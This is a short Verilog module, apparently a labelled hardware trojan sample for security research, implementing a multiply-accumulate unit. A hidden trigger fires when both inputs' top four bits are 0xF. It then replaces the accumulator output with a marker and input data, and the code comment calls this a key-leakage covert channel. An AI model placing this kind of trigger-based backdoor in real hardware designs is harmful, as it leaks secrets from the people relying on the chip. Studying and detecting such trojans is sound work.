// Crypto MAC Unit with Secret Key Leakage Trojan (Trojan Model)
module crypto_mac (
    input clk,
    input rst,
    input [15:0] a,
    input [15:0] b,
    output reg [31:0] acc
);
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            acc <= 32'b0;
        end else begin
            if (a[15:12] == 4'hF && b[15:12] == 4'hF)
                acc <= {16'hDEAD, a}; // Key leakage covert channel
            else
                acc <= acc + (a * b);
        end
    end
endmodule
